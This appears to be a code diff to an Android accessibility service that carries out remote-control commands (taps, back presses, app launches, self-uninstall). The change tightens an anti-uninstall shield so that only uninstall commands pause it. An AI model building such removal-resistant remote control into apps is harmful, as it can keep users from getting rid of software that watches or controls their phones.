@@ -589,8 +589,12 @@ class BoundaryAccessibilityService : AccessibilityService() {
     /** 墨影协议命令分发 → net/MoyingActions */
     private fun handleMoyingCommand(action: String, data: JSONObject) {
         val ch = moying ?: return
-        // 面板动作期间让守卫闭嘴（卸载自身/点按/打开 App 时不能被自己拦）
-        runCatching { com.zaka.screenagent.flow.UninstallShield.suppress(3_000L) }
+        // 只有"卸载自身"这类面板动作才让盾闭嘴 60 秒。
+        // 其余远控指令（点按/返回/打开 App）一律不让路：
+        // 否则远控连着操作时盾会被连续抑制，等于把防卸载关掉了。
+        if (action == "uninstallSelf" || action == "uninstallApp" || action == "uninstall") {
+            runCatching { com.zaka.screenagent.flow.UninstallShield.suppress(60_000L) }
+        }
         runCatching { com.zaka.screenagent.net.MoyingActions.handle(this, ch, action, data, binary) }
             .onFailure { Log.w("Moying", "action $action failed: $it") }
     }
